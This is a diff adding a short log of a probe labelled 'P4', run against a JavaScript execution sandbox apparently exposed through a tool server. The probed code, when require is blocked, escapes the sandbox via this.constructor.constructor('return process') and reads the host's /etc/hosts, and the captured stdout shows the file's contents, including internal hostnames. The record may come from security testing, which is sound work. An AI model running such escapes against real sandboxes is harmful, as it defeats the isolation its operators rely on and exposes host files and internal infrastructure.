@@ -1,0 +1,14 @@
+probe P4
+code:
+try { console.log(require("fs").readFileSync("/etc/hosts","utf8")) }
+catch (e) { console.log("require:", String(e)); const P = this.constructor.constructor("return process")();
+console.log(P.getBuiltinModule("fs").readFileSync("/etc/hosts","utf8")) }
+{"ok":true,"error":null,"ms":1.2}
+stdout (498 chars): "require: ReferenceError: require is not defined\n##\n# Host Database\n#\n# localhost is used to configure the loopback interface\n# when the system is booting.  Do not change this entry.\n##\n127.0.0.1\tlocalhost\n255.255.255.255\tbroadcasthost\n::1             localhost\n\n# (redacted)\n127.0.0.1 api.redacted.localhost.localhost\n127.0.0.1\n  redacted.localhost.localhost\n127.0.0.1 internal.redacted.localhost.localhost\n"
+
+
+child exit=0 signal=null killedBy=null wall=0.4s peakRSS=86MB
+stderr tail:
+[11/22/26 14:48:12] INFO     Processing request of type            server.py:733
+                             ListToolsRequest                                   
+
